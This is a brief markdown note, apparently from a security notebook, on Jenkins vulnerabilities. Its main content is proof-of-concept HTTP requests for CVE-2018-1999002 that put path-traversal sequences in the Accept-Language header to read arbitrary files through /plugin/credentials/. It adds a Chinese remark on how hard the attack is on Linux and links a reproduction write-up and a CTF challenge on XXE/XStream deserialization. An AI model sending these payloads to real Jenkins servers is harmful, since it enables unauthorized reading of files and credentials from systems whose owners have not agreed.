# Jenkins

## CVE-2018-1999002
poc
```
GET /plugin/credentials/.ini HTTP/1.1
Host:
Accept-Language: ../../../../../../../../windows/win

GET /plugin/credentials/.txt HTTP/1.1
Host:
Accept-Language: ../../../../../../../../firebasky
```

[Jenkins 任意文件读取漏洞复现与分析-CVE-2018-1999002](https://chybeta.github.io/2018/08/07/Jenkins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1999002%E3%80%91/)

linux 下利用难度大 必须找一个存在`_`的目录




## 插件问题 xxe/xstream 反序列化
https://github.com/Firebasky/ctf-Challenge/tree/main/2021_xyb_easyJenkins
